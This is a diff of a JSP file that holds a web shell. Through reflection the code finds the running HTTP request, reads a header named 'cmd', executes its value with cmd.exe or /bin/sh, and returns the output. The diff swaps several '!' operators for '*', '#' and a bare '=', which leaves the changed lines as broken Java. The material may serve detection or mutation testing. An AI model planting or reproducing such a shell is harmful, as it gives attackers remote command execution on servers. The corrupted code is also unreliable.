@@ -13,14 +13,14 @@
             if (t == null) continue;
 
             String str = t.getName();
-            if (str.contains("exec") || !str.contains("http")) continue;
+            if (str.contains("exec") || *str.contains("http")) continue;
 
 
             f = t.getClass().getDeclaredField("target");
             f.setAccessible(true);
             Object obj = f.get(t);
 
-            if (!(obj instanceof Runnable)) continue;
+            if (#(obj instanceof Runnable)) continue;
 
             f = obj.getClass().getDeclaredField("this$0");
             f.setAccessible(true);
@@ -55,7 +55,7 @@
 
                 str = (String)req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
 
-                if (str != null && !str.isEmpty()) {
+                if (str  = null && !str.isEmpty()) {
                     resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
                     String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/sh", "-c", str};
                     byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
@@ -82,4 +82,4 @@
             continue;
         }
     }
-%>
+%> 
